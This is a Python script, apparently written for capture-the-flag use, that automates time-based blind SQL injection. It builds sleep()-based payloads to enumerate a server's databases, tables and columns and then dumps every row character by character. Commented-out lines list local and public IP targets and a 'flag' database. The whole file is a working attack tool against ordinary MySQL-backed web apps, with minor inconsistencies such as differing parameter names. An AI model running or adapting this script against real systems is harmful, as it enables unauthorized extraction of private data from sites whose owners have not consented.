import requests
import time
import string

# url = "http://127.0.0.1/sql_time/index.php"
method = input("method: ")
printable = "abcdefghijklmnopqrstuvwxyz_{}<=>,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&\\'()*+-./:;?@[\\\\]^_`|~ \\t\\n\\r\\x0b\\x0c"

def request(method, url, payload):
    if method == "post":
        requests.post(url=url, data=payload)
        # print(a.status_code, sep=" ", end=" ")
    if method == "get":
        requests.get(url=url, params=payload)


class Database:
    def __init__(self, url):
        self.url = url
        self.information = {}

    def start(self):
        self.__num_of_database()
        self.__database_name_length()
        self.__database_name()
        return self.information

    def __num_of_database(self):
        payload = {}
        for i in range(1, 100):
            print(i, sep=" ", end=" ")
            time.sleep(1)
            msg_database = "1' and if(((select count(schema_name) from information_schema.schemata)=" + str(i) + "),sleep(3),1) -- "
            payload["password"] = msg_database
            time1 = time.time()
            request(method, self.url, payload)
            if time.time() - time1 > 3:
                print('num_of_database: ' + str(i))
                self.information["num_of_database"] = i
                # print(i)
                break

    def __database_name_length(self):  #每个数据库名长度
        payload = {}
        d = {}
        for i in range(1, self.information["num_of_database"] + 1):
            for k in range(1, 40):
                time.sleep(1)
                msg = "1' and if((select length(schema_name) from information_schema.schemata limit " + str(i - 1) + ",1)=" + str(k) + ",sleep(3),1) -- "
                # print(msg)
                payload["sql"] = msg
                time1 = time.time()
                request(method, self.url, payload)

                if time.time() - time1 > 3:
                    print('length of ' + str(i) + " database: " + str(k))
                    d["database " + str(i)] = k
                    break
        self.information["length_of_each_database"] = d

    def __database_name(self):
        payload = {}
        d = {}
        print("Database name: ")
        for i in range(self.information["num_of_database"]):  # 循环 数据库个数 次
            base_name = ""
            for k in range(1, self.information["length_of_each_database"]["database " + str(i + 1)] + 1):  # 查询每个数据库名字
                for a in printable:
                    time.sleep(1)
                    msg = "1' and if((SELECT ascii(substr((select SCHEMA_NAME)," + str(k) + ",1)) from information_schema.SCHEMATA LIMIT " + str(i) + ",1)=" + str(ord(a)) + ", sleep(3), 1) -- "
                    # print(msg)
                    payload["sql"] = msg
                    time1 = time.time()
                    request(method, self.url, payload)
                    if time.time() - time1 > 3:
                        print(a, end=" ", sep=" ")
                        base_name += a
                        break
            d[i+1] = base_name
            print(" => ", base_name)
        self.information["database_name"] = d


class TableInformation:  # 查看数据库的表的大概信息
    def __init__(self, url, database_name):
        self.database_name = database_name
        self.information = {}
        self.url = url

    def start(self):
        self.__table_num()
        self.__table_length()
        self.__table_name()
        return self.information

    def __table_num(self):
        payload = {}
        for i in range(1, 100):  # 获得该数据库中表的个数
            time.sleep(1)
            msg = "1 and if((SELECT count(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='" + self.database_name + "')=" + str(i) + ",sleep(3),1)"
            payload["sql"] = msg
            time1 = time.time()
            request(method, self.url, payload)
            print(i, sep=" ", end=" ")
            if time.time() - time1 > 3:
                self.information["num_of_table"] = i
                print(self.database_name + " has " + str(i) + " tables")
                break

    def __table_length(self):
        payload = {}
        d = {}
        for i in range(0, self.information["num_of_table"]):  # 获取每个表名字的长度
            for k in range(1, 100):
                time.sleep(1)
                msg = "1 and if((SELECT length(TABLE_NAME) FROM information_schema.tables WHERE TABLE_schema='" + self.database_name + "' LIMIT " + str(i) + ",1)="+str(k)+",sleep(3),1)"
                time1 = time.time()
                payload["sql"] = msg
                request(method, self.url, payload)

                if time.time() - time1 > 3:
                    d['table_length ' + str(i + 1)] = k
            self.information["table_length"] = d

        print(self.information)

    def __table_name(self):
        d = {}
        payload = {}
        for i in range(self.information["num_of_table"]):  # 获取每个表的名字
            table_name = ""
            for h in range(1, self.information["table_length"]['table_length ' + str(i + 1)] + 1):
                for k in printable:
                    # print(k,sep=" ",end=" ")
                    time.sleep(2)
                    msg = "1 and if((SELECT ascii(substr((select table_name)," + str(h) + ",1)) from information_schema.tables WHERE TABLE_schema='" + self.database_name + "' LIMIT " + str(i) + ",1)=" + str(ord(k)) + ", sleep(3), 1)"
                    time1 = time.time()
                    payload["sql"] = msg
                    request(method, self.url, payload)
                    if time.time() - time1 > 3:
                        print(k, sep=" ", end=" ")
                        table_name += k
                        break
            d[i + 1] = table_name
            print(" => ", table_name)
        self.information["table_name"] = d
        print(self.information)


class TableDetails: #爆全部信息
    def __init__(self, url, database_name, table_name):
        self.url = url
        self.database_name = database_name
        self.table_name = table_name
        self.information = {}

    def start(self):
        self.__column_length()
        self.__column_name()
        self.__all_length()
        self.__colum_all()


    def __column_length(self):
        payload = {}
        for i in range(100):
            msg = "1 and if((SELECT length(GROUP_CONCAT(COLUMN_name)) from information_schema.columns where table_name='" + self.table_name + "')=" + str(i) + ",sleep(3),1)"
            time1 = time.time()
            payload["sql"] = msg
            request(method, self.url, payload)

            if time.time() - time1 > 3:
                self.information["column_length"] = i
                print(i)
                break

    def __column_name(self):  # 得到数据库的列名
        payload = {}
        name = ""
        for i in range(1, self.information["column_length"] + 1):
            time.sleep(2)
            for k in printable:
                time.sleep(1)
                msg = "1 and if(((SELECT ascii(substr(GROUP_CONCAT(COLUMN_name)," + str(i) + ",1)) from information_schema.columns where table_name='"+self.table_name+"')=" + str(ord(k)) + "),sleep(3),1)"
                time1 = time.time()
                payload["sql"] = msg
                request(method, self.url, payload)
                if time.time() - time1 > 3:
                    name += k
                    print(k, sep=" ", end=" ")
                    break
        print(" => ", name)
        self.information["column_name"] = name.split(sep=",")
        print(self.information)

    def __all_length(self):  # 表中所有数据长度
        payload = {}
        n = 1
        co = ",".join(self.information["column_name"])
        while True:
            msg = "1 and if(((SELECT length(GROUP_CONCAT(" + co + ")) FROM " + self.database_name + "." + self.table_name+")=" + str(n) + "),sleep(3),1)"
            time1 = time.time()
            payload["sql"] = msg
            request(method, self.url, payload)
            if time.time() - time1 > 3:
                print(n)
                self.information["length"] = n
                break
            n += 1

    def __colum_all(self):  # 表中所有数据
        payload = {}
        s = ""
        msg = "1 and if(((select ascii(substr(GROUP_CONCAT(concat_ws('=>'"
        for i in range(len(self.information["column_name"])):
            msg += "," + self.information["column_name"][i]
        for i in range(1, self.information["length"] + 1 + (
                self.information["column_length"] * (len(self.information["column_name"]) - 1))):
            for k in string.printable:
                time.sleep(1)
                msgs = msg+"))," + str(i) + ",1)) from " + self.database_name + "." + self.table_name + ")="+str(ord(k))+"),sleep(3),1)"
                time1 = time.time()
                payload["sql"] = msgs
                request(method, self.url, payload)
                if time.time() - time1 > 3:
                    s += k
                    print(k, sep=" ", end=" ")
                    break


# a = Database(url="http://101.200.32.147/index.php?id=")
# a = Database(url="http://127.0.0.1/sql_time/index.php")
# a.start()
# b = TableInformation(url="http://172.81.251.91:9999/index.php", database_name="flag")
# b.start()
# c = TableDetails(url="http://172.81.251.91:9999/index.php", database_name="flag", table_name="flag")
# c.start()